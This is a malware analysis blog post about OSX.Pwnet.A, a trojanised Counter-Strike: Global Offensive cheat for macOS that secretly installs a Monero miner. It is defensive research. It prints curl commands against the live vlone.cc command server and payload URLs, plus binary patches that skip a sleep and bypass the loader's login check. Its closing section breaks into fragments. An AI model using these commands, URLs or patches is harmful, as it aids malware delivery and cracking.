article-hero-title" data-component="Title">CSGO Hacks for Mac That You Shouldn&#x27;t Trust</h1><div class="article-hero-footer"><div class="article-hero-authors"><div class="text-b4-body-400 ui-text-secondary article-hero-author" data-component="Text">By <a class="article-hero-author-link" href="/blog/author/arnaud-abbati/">Arnaud Abbati</a></div></div><div class="article-hero-social"><a data-component="Icon"></i></button></div></div></div></section></div><section class="webui-section v-gutter-l surface-general article-entry"><div class="webui-container"><div class="article-entry-layout"><aside class="article-entry-toc"><nav class="webui-toc" aria-label="Table of Contents" data-component="TableOfContents"><h2 class="text-s3-subhead ui-text-primary webui-toc-title" data-component="Title">Table of Contents</h2><div class="webui-toc-body"><div class="webui-toc-progress" data-toc-progress="true"><div class="progress-bar " style="--total-pages:3;--current-page:1"></div></div><ul class="webui-toc-list"><li class="webui-toc-item"><a href="#entry-point-vlone-cc-portal" class="webui-toc-link" data-toc-id="entry-point-vlone-cc-portal">Entry Point: Vlone.cc Portal</a></li><li class="webui-toc-item"><a href="#binaries-analysis" class="webui-toc-link" data-toc-id="binaries-analysis">Binaries analysis</a></li><li class="webui-toc-item"><a href="#finn-and-ponies" class="webui-toc-link" data-toc-id="finn-and-ponies">Finn and ponies</a></li></ul></div></nav></aside><div class="article-entry-main"><div class="text-rich-longform text-b3-body-400"><p>(Photo source: Pony Strike: Global Offense by <a target="_blank" rel="noopener noreferrer" href="https://filipinoninja95.deviantart.com/art/Pony-Strike-Global-Offense-324156591">FilipinoNinja95</a>)</p><p>We recently found <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Counter-Strike:_Global_Offensive">Counter-Strike: Global Offensive</a> (CS: Go) hacks on macOS that is also a <strong>trojan</strong> that could mine CryptoCurrencies without user consent.</p><p>According to <em>VirusTotal Retrohunt</em>, the threat is in the wild since the beginning of July 2017.</p><p><strong>Warning</strong>: At the time of this writing, all URLs are live.</p><h2 id="entry-point-vlone-cc-portal"><a href="#vlonecc"></a> Entry Point: Vlone.cc Portal</h2><p>The entry point is <a target="_blank" rel="noopener noreferrer" href="https://vlone.cc/">vlone.cc</a> portal, where a user can <a target="_blank" rel="noopener noreferrer" href="https://vlone.cc/portal/index.php?page=register">Register</a>, <a target="_blank" rel="noopener noreferrer" href="https://vlone.cc/portal/index.php?page=login">Login</a> and <a target="_blank" rel="noopener noreferrer" href="https://vlone.cc/portal/download.php">Download</a> for free the hack <em>installer</em>.</p><p>The domain name was registered through <em>eNom</em> in April 2017, 14th, and resolves to a <a target="_blank" rel="noopener noreferrer" href="https://www.robtex.com/ip-lookup/198.54.115.80">shared web host</a> at <!-- --><em>namecheap</em>:<!-- --></p><pre class="hjs-code-block" data-component="CodeBlock"><code>$ dig vlone.cc +short
198.54.115.80
$ dig -x 198.54.115.80 +short 
server205-2.web-hosting.com.</code></pre><p>HTTPS certificate was delivered by <em>COMODO PositiveSSL</em> in June 2017, 27th.</p><p>When logged in, members can browse the <a target="_blank" rel="noopener noreferrer" href="https://vlone.cc/portal/index.php?page=prices">Prices</a> page and purchase a premium subscription for 1, 3 or 6 months through <a target="_blank" rel="noopener noreferrer" href="https://selly.gg/u/pwned">Selly</a>:</p><p><img alt="" loading="lazy" width="600" height="450" decoding="async" data-nimg="1" style="color:transparent" sizes="(max-width: 768px) 100vw, 768px" srcSet="https://images.contentstack.io/v3/assets/blt53c99b43892c2378/blt818a8a00bfb872ec/6a57b3a24e8e09e14a2d181b/pwnednet_prices.jpg?width=375&amp;quality=90&amp;format=auto 375w, https://images.contentstack.io/v3/assets/blt53c99b43892c2378/blt818a8a00bfb872ec/6a57b3a24e8e09e14a2d181b/pwnednet_prices.jpg?width=768&amp;quality=90&amp;format=auto 768w, https://images.contentstack.io/v3/assets/blt53c99b43892c2378/blt818a8a00bfb872ec/6a57b3a24e8e09e14a2d181b/pwnednet_prices.jpg?width=1280&amp;quality=90&amp;format=auto 1280w, https://images.contentstack.io/v3/assets/blt53c99b43892c2378/blt818a8a00bfb872ec/6a57b3a24e8e09e14a2d181b/pwnednet_prices.jpg?width=1920&amp;quality=90&amp;format=auto 1920w, https://images.contentstack.io/v3/assets/blt53c99b43892c2378/blt818a8a00bfb872ec/6a57b3a24e8e09e14a2d181b/pwnednet_prices.jpg?width=2560&amp;quality=90&amp;format=auto 2560w" src="https://images.contentstack.io/v3/assets/blt53c99b43892c2378/blt818a8a00bfb872ec/6a57b3a24e8e09e14a2d181b/pwnednet_prices.jpg?width=2560&amp;quality=90&amp;format=auto"/></p><p>Members download the same archive of the <em>free installer</em> than guests:</p><pre class="hjs-code-block" data-component="CodeBlock"><code>$ curl -s https://vlone.cc/portal/download.php | shasum -a 256
b1bdb4502f5051309582f72a62c14d9919d3c86de3dcfa0b3a5f008cb5a018fe -
$ curl -s https://vlone.cc/portal/download.php -G -d user=1234 -d free | shasum -a 256
b1bdb4502f5051309582f72a62c14d9919d3c86de3dcfa0b3a5f008cb5a018fe -</code></pre><p>According to the <!-- -->user<!-- --> GET query value, members count in August 2017, 22nd, is nearly two thousand.</p><p>We don’t know if the <em>private installer</em> of the hack also installs the mining software without user consent.</p><p><img alt="" loading="lazy" width="600" height="450" decoding="async" data-nimg="1" style="color:transparent" sizes="(max-width: 768px) 100vw, 768px" srcSet="https://images.contentstack.io/v3/assets/blt53c99b43892c2378/bltde0d24ae9bcdcc2a/6a57b3a44e8e09a3472d181f/pwnednet_download.jpg?width=375&amp;quality=90&amp;format=auto 375w, https://images.contentstack.io/v3/assets/blt53c99b43892c2378/bltde0d24ae9bcdcc2a/6a57b3a44e8e09a3472d181f/pwnednet_download.jpg?width=768&amp;quality=90&amp;format=auto 768w, https://images.contentstack.io/v3/assets/blt53c99b43892c2378/bltde0d24ae9bcdcc2a/6a57b3a44e8e09a3472d181f/pwnednet_download.jpg?width=1280&amp;quality=90&amp;format=auto 1280w, https://images.contentstack.io/v3/assets/blt53c99b43892c2378/bltde0d24ae9bcdcc2a/6a57b3a44e8e09a3472d181f/pwnednet_download.jpg?width=1920&amp;quality=90&amp;format=auto 1920w, https://images.contentstack.io/v3/assets/blt53c99b43892c2378/bltde0d24ae9bcdcc2a/6a57b3a44e8e09a3472d181f/pwnednet_download.jpg?width=2560&amp;quality=90&amp;format=auto 2560w" src="https://images.contentstack.io/v3/assets/blt53c99b43892c2378/bltde0d24ae9bcdcc2a/6a57b3a44e8e09a3472d181f/pwnednet_download.jpg?width=2560&amp;quality=90&amp;format=auto"/></p><h2 id="binaries-analysis"><a href="#binaries-analysis"></a>Binaries analysis</h2><p>It’s all C++ Standard Library code. Network connections use <a target="_blank" rel="noopener noreferrer" href="https://curl.haxx.se/libcurl/">libcurl</a> and secure HTTPS protocol.</p><p>All executables, but the <em>miner</em> CLI, require super-user privileges, so the user must run the <em>installer</em> with <!-- -->sudo<!-- -->:</p><pre class="hjs-code-block" data-component="CodeBlock"><code>$ ./vHook 
Root access required!
Please type &quot;sudo ./vhook&quot;</code></pre><p>The main binary hides itself as <a target="_blank" rel="noopener noreferrer" href="http://www.dynamsoft.com/Products/WebTWAIN_Overview.aspx">Dynamic Web TWAIN</a>, an online document scanning platform.</p><h3 id="vhook"><a href="#vhook"></a>vHook</h3><p>vHook<!-- --> is the <em>installer</em>. It is packed with <a target="_blank" rel="noopener noreferrer" href="https://github.com/upx/upx">UPX</a>, probably to avoid user analysis and bypass some security products.</p><p>It is a command line interface:</p><pre class="hjs-code-block" data-component="CodeBlock"><code>$ sudo ./vHook 
[vlone] vHook public [vlone]
Username: USERNAME
Password: PASSWORD
[vlone] Welcome to vHook Public, USERNAME!
[vlone] Downloading vHook assets..
[vlone] Inflating vHook assets..
[vlone] CS:GO is not running!
[vlone] Cleaning up..
[vlone] Quitting...</code></pre><p>With a valid member account, it downloads and extracts <!-- -->bootstrap.dylib<!-- --> and <!-- -->vhook.dylib<!-- --> from <!-- -->https://vlone.cc/portal/gateway.php<!-- --> as <!-- -->assets.zip<!-- --> to <!-- -->/Library/Application Support/<!-- -->:</p><pre class="hjs-code-block" data-component="CodeBlock"><code>$ curl -s https://vlone.cc/portal/gateway.php -G -d username=USERNAME -d password=PASSWORD -d free | xxd -l 64
00000000: 504b 0304 1400 0000 0800 8696 c14a 9c2e PK...........J..
00000010: 55c2 b606 0000 1827 0000 0f00 1c00 626f U......&#x27;......bo
00000020: 6f74 7374 7261 702e 6479 6c69 6255 5409 otstrap.dylibUT.
00000030: 0003 9cb9 2f59 d339 8059 7578 0b00 0104 ..../Y.9.Yux....</code></pre><p>It loads <!-- -->bootstrap.dylib<!-- --> from <a target="_blank" rel="noopener noreferrer" href="https://github.com/scen/osxinj">osxinj</a> project. If <em>Counter-Strike: Global Offensive</em> is running, it downloads and extracts some fonts (<!-- -->https://vlone.cc/fontfix.zip<!-- --> as <!-- -->vlone.zip<!-- --> to <!-- -->/Library/Fonts/<!-- -->), and injects <!-- -->vhook.dylib<!-- --> into <!-- -->csgo_osx64<!-- --> process.</p><p>It could be a perfect deal for a <em>CS: GO</em> user, but it turns out <!-- -->vHook<!-- --> also sneaky downloads and extracts <!-- -->https://vlone.cc/abc/assets/asset.zip<!-- --> as <!-- -->fonts.zip<!-- --> to <!-- -->/var/<!-- -->, changes directory to <!-- -->/var<!-- --> and runs <!-- -->sudo ./helper &amp;<!-- -->.</p><p>It then kills <em>Terminal</em> application to hide the detached process output.</p><h3 id="helper"><a href="#helper"></a>helper</h3><p>helper<!-- --> is the <em>miner downloader</em> dropper. It is also packed with UPX.</p><p>It first asks the C&amp;C server for the name of the binary to execute upon download:</p><pre class="hjs-code-block" data-component="CodeBlock"><code>$ curl https://www.vlone.cc/abc/commands/update.php?request -F command=newfile
&lt;span style=&quot;color: #ff0000;&quot;&gt;&lt;strong&gt;com.dynamsoft.webhelper&lt;/strong&gt;&lt;/span&gt;</code></pre><p>It downloads <!-- -->https://www.vlone.cc/abc/assets/b.zip<!-- --> as <!-- -->/b.zip<!-- -->, extracts its contents to <!-- -->/var/.log/<!-- -->, changes directory to <!-- -->/var/.log/<!-- --> and runs <!-- -->sudo ./com.dynamsoft.WebHelper &amp;<!-- -->.</p><p>At the time of this writing, <!-- -->https://www.vlone.cc/abc/assets/b.zip<!-- --> URL response is a <em>File Not Found</em> 404 error code, but <!-- -->https://www.vlone.cc/abc/assets/bz.zip<!-- --> URL is live and send the expected archive.</p><h3 id="com-dynamsoft-webhelper"><a href="#comdynamsoftwebhelper"></a>com.dynamsoft.WebHelper</h3><p>com.dynamsoft.WebHelper<!-- --> is the <em>miner</em> downloader. Despite the name, it is not related to Dynamsoft.</p><p>It starts by downloading and extracting:</p><ul><li>WebTwainService<!-- --> from <!-- -->https://www.vlone.cc/abc/assets/d.zip<!-- --> to <!-- -->/var/.log/</li><li>com.dynamsoft.WebTwainService.plist<!-- --> from <!-- -->https://www.vlone.cc/abc/assets/p.zip<!-- --> to <!-- -->/Library/LaunchDaemons/</li></ul><p>It loads the daemon, sends computer unique identifier (UUID) and its version to C&amp;C server, and checks if it <!-- -->meetsRequirements()<!-- -->, i.e. running as <!-- -->root<!-- --> and not in a debugger:</p><pre class="hjs-code-block" data-component="CodeBlock"><code>$ curl -s https://www.vlone.cc/abc/hub.php?init -F version=1.2.1 -F hwid=$(uuidgen)
created continue</code></pre><p>It then sleeps for one hour. If one is in a hurry, he or she can cut out the nap easily:</p><pre class="hjs-code-block" data-component="CodeBlock"><code>__text:0000000100016A5F BF &lt;span style=&quot;color: #ff0000;&quot;&gt;&lt;strong&gt;01 00&lt;/strong&gt;&lt;/span&gt; 00 00 mov edi, &lt;span style=&quot;color: #ff0000;&quot;&gt;&lt;strong&gt;1&lt;/strong&gt;&lt;span style=&quot;color: #ff0000;&quot;&gt;&lt;del&gt;800&lt;/del&gt;&lt;/span&gt;&lt;/span&gt; ; unsigned int
__text:0000000100016A64 E8 5B 72 00 00 call _sleep</code></pre><p>Once rested, it sends commands to C&amp;C server every minute to ask if it should mine and update or kill itself:</p><pre class="hjs-code-block" data-component="CodeBlock"><code>$ curl -s https://www.vlone.cc/abc/commands/mine.php?request -F command=mine
true
$ curl -s https://www.vlone.cc/abc/commands/update.php?request -F command=update
false
$ curl -s https://www.vlone.cc/abc/commands/kill.php?request -F command=kill
false</code></pre><p>Every minute, it also creates or updates the mining thread to:</p><ul><li>download and extract <!-- -->https://www.vlone.cc/abc/assets/helper.zip<!-- --> to <!-- -->/var/.trash/.assets/</li><li>get miner settings (maximum core number, currency, email address)</li><li>check if <em>Activity Monitor</em> is running</li><li>check if it is already mining</li><li>check if it should stop mining</li><li>run <!-- -->cd /var/.trash/.assets/; ./com.apple.SafariHelper<!-- --> with appropriate arguments</li></ul><p><a target="_blank" rel="noopener noreferrer" href="https://www.sentinelone.com/blog/sentinelone-best-av-macos/">Read more: SENTINELONE – THE BEST AV FOR MACOS</a></p><h3 id="webtwainservice"><a href="#webtwainservice"></a>WebTwainService</h3><p>WebTwainService<!-- --> tries to take care of <!-- -->com.dynamsoft.webhelper<!-- --> persistency. It is again packed with UPX.</p><p>It sets its current directory to <!-- -->/var/.log<!-- --> and runs <!-- -->sudo ./com.dynamsoft.webhelper &amp;<!-- -->, then recursively sleeps for one hour…</p><h3 id="minergate-cli"><a href="#minergate-cli"></a>minergate-cli</h3><p>com.apple.SafariHelper<!-- --> actually is the official <a target="_blank" rel="noopener noreferrer" href="https://minergate.com/">MinerGate</a> <a target="_blank" rel="noopener noreferrer" href="https://minergate.com/downloads/console">CLI</a> v4.04:</p><pre class="hjs-code-block" data-component="CodeBlock"><code>$ shasum -a 256 MinerGate-cli-4.04-Mac/minergate-cli com.apple.SafariHelper
b943369a2ae7afb3522f3b1c40c15208bff0444d47d0df476dd585cf9cbf7c10 MinerGate-cli-4.04-Mac/minergate-cli
b943369a2ae7afb3522f3b1c40c15208bff0444d47d0df476dd585cf9cbf7c10 com.apple.SafariHelper</code></pre><p>It is written in <a target="_blank" rel="noopener noreferrer" href="https://www.qt.io/">Qt</a>, so it comes with frameworks:</p><pre class="hjs-code-block" data-component="CodeBlock"><code>$ find /private/.trash -type f
/private/.trash/.assets/com.apple.SafariHelper
/private/.trash/.assets/Frameworks/QtCore.framework/Versions/5/QtCore
/private/.trash/.assets/Frameworks/QtNetwork.framework/Versions/5/QtNetwork
/private/.trash/.assets/Frameworks/QtSql.framework/Versions/5/QtSql
/private/.trash/.assets/Frameworks/QtWebSockets.framework/Versions/5/QtWebSockets</code></pre><p>It takes as CPU as requested by <!-- -->com.dynamsoft.WebHelper<!-- --> so the user enjoys the delight of computer’s fans background music:</p><pre class="hjs-code-block" data-component="CodeBlock"><code>$ ps axu | grep [c]om.apple.SafariHelper
root 474  0.2 2490592 14204 s000 R+ 3:07AM 3:21.87 ./com.apple.SafariHelper -user pwnedboi@protonmail.com --xmr 2</code></pre><p>In this example, it is mining <a target="_blank" rel="noopener noreferrer" href="https://coinmarketcap.com/currencies/monero/">Monero</a> (XMR) with all virtual machine cores (two: 200.0%).</p><p>Current MinerGate email address is <!-- -->pwnedboi@protonmail.com<!-- -->, and <!-- -->xxanax420@gmail.com<!-- --> email address was also found hardcoded in <a target="_blank" rel="noopener noreferrer" href="https://www.virustotal.com/file/5da305ed63f60bfece8641cb15aeaecfd4d1a615b07361e9449ab971f02014fb/analysis/1501332838/">another sample</a>.</p><p>Maximum core number, CryptoCurrency and email address are provided by <!-- -->com.dynamsoft.WebHelper<!-- --> and the C&amp;C server:</p><pre class="hjs-code-block" data-component="CodeBlock"><code>$ curl -s https://www.vlone.cc/abc/commands/mine.php?request -F mine=cores
4
$ curl -s https://www.vlone.cc/abc/commands/mine.php?request -F mine=coin
xmr
$ curl -s https://www.vlone.cc/abc/commands/mine.php?request -F mine=email
pwnedboi@protonmail.com</code></pre><h3 id="vloader"><a href="#vloader"></a>vLoader</h3><p>We finally ended up with <!-- -->vLoader<!-- -->, the <a target="_blank" rel="noopener noreferrer" href="https://www.virustotal.com/file/4d104b10b54f27a8828f5cf696df897e19d62cba844733a8e7867ee421582f1d/analysis/1503603575/"><em>private installer</em></a>, and, once more, it is packed with UPX.</p><p>It does many checks against the C&amp;C server:</p><pre class="hjs-code-block" data-component="CodeBlock"><code>$ curl -s https://www.vlone.cc/pwned.php -F user=USERNAME -F pass=PASSWORD -F hwid=$(uuidgen)
204
$ curl -s https://www.vlone.cc/sub.php -F user=USERNAME
00/00/0000</code></pre><p><img alt="" loading="lazy" width="865" height="450" decoding="async" data-nimg="1" style="color:transparent" sizes="(max-width: 768px) 100vw, 768px" srcSet="https://images.contentstack.io/v3/assets/blt53c99b43892c2378/bltc5cbc2b62056a1a8/6a57b3a6ea43153c182c508c/pwnednet_vloader_ermsg.jpg?width=375&amp;quality=90&amp;format=auto 375w, https://images.contentstack.io/v3/assets/blt53c99b43892c2378/bltc5cbc2b62056a1a8/6a57b3a6ea43153c182c508c/pwnednet_vloader_ermsg.jpg?width=768&amp;quality=90&amp;format=auto 768w, https://images.contentstack.io/v3/assets/blt53c99b43892c2378/bltc5cbc2b62056a1a8/6a57b3a6ea43153c182c508c/pwnednet_vloader_ermsg.jpg?width=1280&amp;quality=90&amp;format=auto 1280w, https://images.contentstack.io/v3/assets/blt53c99b43892c2378/bltc5cbc2b62056a1a8/6a57b3a6ea43153c182c508c/pwnednet_vloader_ermsg.jpg?width=1920&amp;quality=90&amp;format=auto 1920w, https://images.contentstack.io/v3/assets/blt53c99b43892c2378/bltc5cbc2b62056a1a8/6a57b3a6ea43153c182c508c/pwnednet_vloader_ermsg.jpg?width=2560&amp;quality=90&amp;format=auto 2560w" src="https://images.contentstack.io/v3/assets/blt53c99b43892c2378/bltc5cbc2b62056a1a8/6a57b3a6ea43153c182c508c/pwnednet_vloader_ermsg.jpg?width=2560&amp;quality=90&amp;format=auto"/></p><p>They are trivial to bypass for anyone who can force a conditional jump:</p><pre class="hjs-code-block" data-component="CodeBlock"><code>__text:0000000100010570 A8 01 test al, 1
__text:0000000100010572 &lt;span style=&quot;color: #ff0000;&quot;&gt;&lt;strong&gt;90 E9&lt;/strong&gt;&lt;/span&gt; 05 00 00 00 &lt;span style=&quot;color: #ff0000;&quot;&gt;&lt;strong&gt;j&lt;del&gt;nz&lt;/del&gt;&lt;/strong&gt;&lt;/span&gt; loc_10001057D
__text:0000000100010578 E9 08 01 00 00 jmp loc_100010685
__text:000000010001057D ; ---------------------------------------------------------------------------
__text:000000010001057D
__text:000000010001057D loc_10001057D: ; CODE XREF: dna8o::in(void)+862

__text:0000000100010584 48 8D 35 84 53 00 00 lea rsi, aLoggedInSucces ; &quot;Logged in successfully&quot;</code></pre><p><em>Private</em> payloads are downloaded and extracted to <!-- -->/var/.old/<!-- -->:</p><ul><li>boots.dylib<!-- --> from <!-- -->http://vlone.cc/clear/sadmio.zip</li><li>.uhdexter.dylib<!-- --> from <!-- -->http://vlone.cc/clear/getout.zip</li></ul><p>Compared to the <em>free</em> injected library, the <em>private</em> hook is very similar:</p><p><img alt="" loading="lazy" width="677" height="450" decoding="async" data-nimg="1" style="color:transparent" sizes="(max-width: 768px) 100vw, 768px" srcSet="https://images.contentstack.io/v3/assets/blt53c99b43892c2378/blte23ed0ce649cd407/6a57b3a74e8e0971f92d1827/pwnednet_bindiff.jpg?width=375&amp;quality=90&amp;format=auto 375w, https://images.contentstack.io/v3/assets/blt53c99b43892c2378/blte23ed0ce649cd407/6a57b3a74e8e0971f92d1827/pwnednet_bindiff.jpg?width=768&amp;quality=90&amp;format=auto 768w, https://images.contentstack.io/v3/assets/blt53c99b43892c2378/blte23ed0ce649cd407/6a57b3a74e8e0971f92d1827/pwnednet_bindiff.jpg?width=1280&amp;quality=90&amp;format=auto 1280w, https://images.contentstack.io/v3/assets/blt53c99b43892c2378/blte23ed0ce649cd407/6a57b3a74e8e0971f92d1827/pwnednet_bindiff.jpg?width=1920&amp;quality=90&amp;format=auto 1920w, https://images.contentstack.io/v3/assets/blt53c99b43892c2378/blte23ed0ce649cd407/6a57b3a74e8e0971f92d1827/pwnednet_bindiff.jpg?width=2560&amp;quality=90&amp;format=auto 2560w" src="https://images.contentstack.io/v3/assets/blt53c99b43892c2378/blte23ed0ce649cd407/6a57b3a74e8e0971f92d1827/pwnednet_bindiff.jpg?width=2560&amp;quality=90&amp;format=auto"/></p><p>vLoader<!-- --> doesn’t uninstall any of the <em>free</em> version naughty payloads.</p><h2 id="finn-and-ponies"><a href="#finn-and-ponies"></a>Finn and ponies</h2><p>We didn’t spend too much time reverse engineering <!-- -->vhook.dylib<!-- -->. The source code was available on <a target="_blank" rel="noopener noreferrer" href="https://github.com/fetusfinn/vHook">GitHub</a> (<a target="_blank" rel="noopener noreferrer" href="https://mega.nz/#!UN0xzBqT!s94ZfgorF5ay547EEFu9-h03kIDf6_Bw-wenoPBslq0">archive</a>) and videos of the hack are also available on YouTube <a target="_blank" rel="noopener noreferrer" href="https://www.youtube.com/watch?v=A7gaQd5IQ4E">here</a> and <a target="_blank" rel="noopener noreferrer" href="https://www.youtube.com/watch?v=F2o0qjC6TAI">there</a>.</p><p>GitHub owner of the <em>vHook</em> project is <em>fetusfinn</em> (original author is <a target="_blank" rel="noopener noreferrer" href="https://github.com/fetusfinn/vHook/commit/baff8d7b4c9625a9437bd22593a7dc7550eb6dcb"><em>ViKiNG</em></a>) and we coincidentally found debugger symbols matching <em>Finn</em> username in GitHub’s <!-- -->libvHook.dylib<!-- --> and in all analyzed binaries:</p><pre class="hjs-code-block" data-component="CodeBlock"><code>$ for f in github.com/fetusfinn/vHook/libvHook.dylib \
 vHook_unpacked helper_unpacked com.dynamsoft.WebHelper WebTwainService_unpacked
do
 nm -a &quot;$f&quot; | grep -m 1 Finn
done
0000000000000000 - 00 0000 SO /Users//Desktop/c++/vHook/
0000000000000000 - 00 0000 SO /Users/&lt;span style=&quot;color: #ff0000;&quot;&gt;&lt;strong&gt;Finn&lt;/strong&gt;&lt;/span&gt;/Downloads/Archive/vloneLoader/

Shortened to <strong>pwnet</strong>, it sounds like <strong>poney</strong> in French, i.e. <strong>pony</strong> in English and, everybody loves ponies, so here you have <strong>OSX.Pwnet.A</strong>!</p><p>There also is a reference to someone named <em>Jennifer Johansson</em> in Xcode user data:</p><pre class="hjs-code-block" data-component="CodeBlock"><code>$ find github.com/fetusfinn/vHook -type f -path &quot;*nnif*&quot;

github.com/fetusfinn/vHook/vHook.xcodeproj/xcuserdata/&lt;span style=&quot;color: <em>Discord</em> if <em>Finn</em> is much into ponies:</p><p><img alt="" loading="lazy" width="800" height="450" decoding="async" data-nimg="1" style="color:transparent" sizes="(max-width: 768px)
